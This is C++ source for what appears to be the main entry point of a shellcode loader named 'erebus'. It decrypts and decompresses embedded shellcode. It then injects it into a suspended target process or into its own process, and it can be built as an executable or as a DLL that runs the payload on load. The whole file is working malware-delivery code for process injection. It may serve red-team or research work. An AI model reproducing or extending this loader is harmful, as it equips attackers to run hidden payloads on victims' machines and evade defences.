#include "../include/loader.hpp"
#include "../include/shellcode.hpp"

VOID entry(void)
{
	erebus::config.injection_method = erebus::GetInjectionMethod();

	HANDLE process_handle = NULL;
	HANDLE thread_handle = NULL;
	SIZE_T shellcode_size = sizeof(shellcode);

	if (shellcode_size == 0 || (sizeof(shellcode) > 0 && shellcode[0] == 0x00))
	{
		LOG_ERROR("Shellcode is NULL or size is 0 after staging");
		return;
	}

	LOG_SUCCESS("Shellcode staged successfully: %zu bytes", shellcode_size);

#if CONFIG_INJECTION_MODE == 1
	// Remote injection: create suspended process
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	LOG_INFO("Creating suspended process: %ls", cmdline);
	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle))
	{
		LOG_ERROR("Failed to create suspended process");
		return;
	}
	LOG_SUCCESS("Process created (PID: 0x%lX)", GetProcessId(process_handle));
#elif CONFIG_INJECTION_MODE == 2
	// Self injection: use current process
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
	LOG_SUCCESS("Using self-injection (current process)");
#endif

	if (!process_handle || !thread_handle)
	{
		LOG_ERROR("Invalid process or thread handle");
		return;
	}

	// ============================================================
	// PAYLOAD PROCESSING PIPELINE
	// ============================================================
	// 1. Allocate writable buffer for shellcode (decrypt modifies in-place)
	// 2. Decrypt shellcode based on CONFIG_ENCRYPTION_TYPE
	// 3. Decompress shellcode if needed
	// ============================================================

	// Allocate writable memory for shellcode (original is read-only)
	BYTE* shellcode_ptr = (BYTE*)malloc(shellcode_size);
	if (!shellcode_ptr)
	{
		LOG_ERROR("Failed to allocate shellcode buffer");
		return;
	}
	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
	
	erebus::DecryptShellcode(&shellcode_ptr, &shellcode_size);
	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
	
	if (shellcode_ptr == NULL || shellcode_size == 0)
	{
		LOG_ERROR("Shellcode processing failed - invalid result");
		if (shellcode_ptr) free(shellcode_ptr);
		return;
	}

	LOG_SUCCESS("Processed shellcode: %zu bytes", shellcode_size);
	
	// Execute injection
	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);

	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);

	// Cleanup
	if (shellcode_ptr)
		free(shellcode_ptr);

	return;
}

#if _DEBUG

int main()
{
	entry();
	return 0;
}

#elif _WINDLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		entry();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}
#endif
